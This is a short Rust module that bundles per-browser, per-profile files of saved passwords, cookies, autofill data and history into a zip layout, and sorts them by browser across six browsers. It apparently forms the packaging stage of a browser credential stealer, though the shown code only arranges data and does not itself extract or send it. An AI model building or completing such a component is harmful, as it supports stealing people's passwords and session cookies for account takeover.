//! Zip layout: Browser/Profile/{passwords,cookies,autofill,history}.txt

pub const BROWSER_ORDER: &[&str] = &["Brave", "Chrome", "Edge", "Firefox", "LibreWolf", "Waterfox"];

pub const PROFILE_FILES: &[&str] = &["passwords.txt", "cookies.txt", "autofill.txt", "history.txt"];

pub fn push_profile_bundle(
    results: &mut Vec<(String, String)>,
    browser: &str,
    profile: &str,
    passwords: Option<String>,
    cookies: Option<String>,
    autofill: Option<String>,
    history: Option<String>,
) {
    let base = format!("{browser}/{profile}");
    results.push((format!("{base}/passwords.txt"), passwords.unwrap_or_default()));
    results.push((
        format!("{base}/cookies.txt"),
        cookies.unwrap_or_else(|| super::netscape::empty_file()),
    ));
    results.push((format!("{base}/autofill.txt"), autofill.unwrap_or_default()));
    results.push((format!("{base}/history.txt"), history.unwrap_or_default()));
}

pub fn sort_entries(files: &mut [(String, String)]) {
    files.sort_by(|a, b| {
        let browser_a = a.0.split('/').next().unwrap_or("");
        let browser_b = b.0.split('/').next().unwrap_or("");
        let ord_a = BROWSER_ORDER
            .iter()
            .position(|&x| x == browser_a)
            .unwrap_or(usize::MAX);
        let ord_b = BROWSER_ORDER
            .iter()
            .position(|&x| x == browser_b)
            .unwrap_or(usize::MAX);
        ord_a.cmp(&ord_b).then_with(|| a.0.cmp(&b.0))
    });
}
